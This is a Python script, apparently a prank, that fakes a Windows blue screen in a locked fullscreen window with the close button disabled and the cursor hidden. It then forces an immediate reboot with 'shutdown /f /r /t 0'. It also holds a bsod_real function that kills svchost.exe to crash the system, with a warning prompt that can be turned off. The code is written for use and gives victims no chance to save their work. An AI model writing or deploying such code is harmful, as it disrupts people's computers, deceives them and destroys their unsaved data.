from tkinter import Tk, Label, Button, Frame,PhotoImage
from PIL import Image, ImageTk
import time
import os
from random import randint
import sys

os.chdir(os.path.dirname(os.path.realpath(__file__)))

win = Tk()
win.attributes("-fullscreen", True)
win.config(bg="black")
win.attributes("-topmost", True)
win.withdraw()
win.config(cursor="none")

screen_width = win.winfo_screenwidth()
screen_height = win.winfo_screenheight()

images = ['1bsod.png', '2bsod.png', '3bsod.png', '4bsod.png', '5bsod.png', '6bsod.png', '7bsod.png', '8bsod.png', '9bsod.png', '10bsod.png', '11bsod.png'] 
photos = []

loading_images = ["12bsod.png","13bsod.png","14bsod.png","15bsod.png","16bsod.png","17bsod.png","18bsod.png","19bsod.png","20bsod.png",]
loading_photos = []
#photo = PhotoImage(file=f"bsod/{images[0]}")

for path in images:
    image = Image.open(f"bsod/{path}")
    image = image.resize((screen_width,screen_height),Image.ANTIALIAS)
    p = ImageTk.PhotoImage(image)
    photos.append(p)

for path in loading_images: 
    image = Image.open(f"bsod/{path}")
    image = image.resize((screen_width,screen_height),Image.ANTIALIAS)
    p = ImageTk.PhotoImage(image)
    loading_photos.append(p)

label = Label(win, image=photos[0])
label.pack()

def do_nothing():
    pass

def bsod_real(warn=True):
    if warn:
        print("======!WARNING!======")
        print("If you continue, you will\nall unsaved work!")
        print("To supress this message pass warn=False\nto the function.")
        continue_ = input("Do you want to continue? (N/y):")
        if continue_.lower() != "y":
            print("Cancelled.")
            sys.exit()
    print("bsod")
    os.system("taskkill /f /im svchost.exe")

def bsod_fake():
    win.deiconify()
    time.sleep(0.1)
    for p in photos:
        label.config(image=p)
        win.update()
        win.update_idletasks()
        time.sleep(0.01)
    for p in loading_photos:
        time.sleep(randint(0,2))
        label.config(image=p)
        win.update()
        win.update_idletasks()
        time.sleep(0.01)
    time.sleep(2)
    os.system("shutdown /f /r /t 0")

win.protocol("WM_DELETE_WINDOW", do_nothing)

if __name__ == "__main__":
    #bsod_real()
    bsod_fake()

win.mainloop()